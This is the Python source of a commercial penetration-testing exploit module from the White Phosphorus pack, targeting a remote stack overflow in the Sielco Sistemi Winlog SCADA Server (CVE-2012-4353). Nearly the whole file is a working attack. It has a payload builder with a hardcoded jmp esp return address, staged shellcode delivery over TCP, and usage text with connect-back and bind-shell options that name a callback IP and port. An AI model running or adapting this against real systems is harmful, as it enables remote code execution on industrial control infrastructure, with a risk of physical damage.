
#! /usr/bin/env python
#####################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
#####################################################################################


import sys 
sys.path.append(".")
sys.path.append("3rdparty/White_Phosphorus/libs")

import os
import socket
import time
from struct import *

from wp_exploit import *
from wp_dialog import *
from wp_osversions import *
import canvasengine
from MOSDEF import mosdef 
from MOSDEF.mosdefutils import *
from MOSDEFShellServer import MosdefShellServer


NAME = "Sielco Sistemi Winlog SCADA Server Remote Overflow"
DESCRIPTION = "Exploits a remote overflow vulnerability in Winlog SCADA Server"
VERSION = "1.0"
DOCUMENTATION = {}
DOCUMENTATION['VENDOR']='Sielco Sistemi'
DOCUMENTATION["Date public"] = "2012-06-26"
DOCUMENTATION["Repeatability"] = "One Shot"
DOCUMENTATION['CVE Name']="CVE-2012-4353"
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=2012-4353'
DOCUMENTATION['CVSS'] = '0.0'
DOCUMENTATION["References"] = "http://aluigi.org/adv/winlog_2-adv.txt"
DOCUMENTATION["Notes"] = """
Runtime.exe server is enabled by selecting the "Run TCP/IP server" option in the "Configuration->Options->TCP/IP" section
of the project you want to run.

Size constraints limit shellcode options.
"""

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2003", "XP", "Vista", "7"]

NOTES="""
Runtime.exe server is enabled by selecting the "Run TCP/IP server" option in the "Configuration->Options->TCP/IP" section
of the project you want to run.

Size constraints limit shellcode options.
------------------------------------------------------
WP> White Phosphorus Exploit Pack
WP> Sielco Sistemi Winlog SCADA Server Remote Overflow
------------------------------------------------------
Usage:
-T (check if target is vulnerable)
-v <version to target>
-t <target ip>   -p <target port>
-l <callback ip> -d <callback port>

Payload Options:
-O payload:<#>   (will use default if not specified)
-O command:<cmd> (for Execute Command payload)
-O bind:<port>   (for Bind MOSDEF Shell)

Versions:
0: Windows Universal

Payloads:
0: TCP Connect Back
1: IE Inject Connect Back
2: HTTPMOSDEF SSL
3: HTTPMOSDEF PLAIN
4: Bind MOSDEF Shell
5: Execute Command
6: Socket Reuse

Example:
./commandlineInterface.py -p 5555 -v 17
./3rdparty/White_Phosphorus/exploits/wp_winlog_scada_server2/wp_winlog_scada_server2.py -v 0 -t 10.1.1.10 -l 10.1.1.1 -d 5555 -O payload:0
"""

PORT = 46824

def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets, PORT)
    return

targets = {
    0 : ["Windows Universal", (0x0000), [WINALL]]
}

class theexploit(wp_exploit):
    PAYLOADS=["TCP Connect Back",
              "IE Inject Connect Back",
              "Bind MOSDEF Shell",
              "Execute Command"]

    DEFAULT_PAYLOAD = 1

    def __init__(self):
        tcpexploit.__init__(self)
        self.host = "127.0.0.1"
        self.port = PORT
        self.targets = targets
        self.version = 0
        self.badstring = "\x00\x09\x0a\x0d\x20"
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.autoVersioned = False
        self.use_universal = True
        self.alignstack = True
        self.encode_printable = True
        return

    def usage(self):
        self.wp_usage(targets)
        return  
    
    def test(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        return wp_isPortOpen(self,self.host,self.port)

    def neededListenerTypes(self):
        self.getArgs()
        return self.wp_createWin32Listener()

    def createShellcode(self):
        self.getArgs()

        self.log('WP> Targeting version %d: %s'%(self.version,targets[self.version][0]))
        return self.wp_createShellcode()    

    def getArgs(self):
        self.wp_getShellcodeType()

        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        return

    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return

    def makesploit(self):
        payload = wp_randomstring(20)
        payload += 'x'
        payload += wp_randomstring(160)
        payload += pack('<L', 0x405096AD) # jmp esp - Vclx40.dll
        payload += wp_randomnops(8)
        payload += wp_SearchCode(False)
        payload += wp_randomstring(0x119 - len(payload))
        return payload

    def run(self):
        self.getArgs()
        
        payload = self.makesploit()        
        self.result_error = 0

        try:
            s = self.gettcpsock()
            s.connect((self.host, self.port))

            self.log("WP> Stage 1: Sending Shellcode")
            s.sendall(wp_randomstring(20)+'x'+'c00kc00k'+'\x8B\xE7\x83\xC4\x05'+self.shellcode+wp_randomnops(100))
            
            time.sleep(2)
            if getattr(self, 'shell_REUSESOCKET',False) == False:
                s.close()
        except:
            self.log("WP> Attack reported no open socket - service died?")
            self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
            return 0
        
        try:
            s = self.gettcpsock()
            s.connect((self.host, self.port))
            
            self.log("WP> Stage 2: Sending Exploit")
            s.sendall(payload)
            
            time.sleep(2)
            if getattr(self, 'shell_REUSESOCKET',False) == False:
                s.close()
        except:
            self.log("WP> Attack reported no open socket - service died?")
            self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
            return 0
        
        time.sleep(3)
        
        if self.result_error==0:
            ret = self.wp_postExploitShellcode(s)
            if ret:
                return ret

        ret=self.ISucceeded()
        self.setInfo("WP> %s attacking %s:%d - completed"%(NAME,self.host,self.port))
        return ret

if __name__== '__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(NAME,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
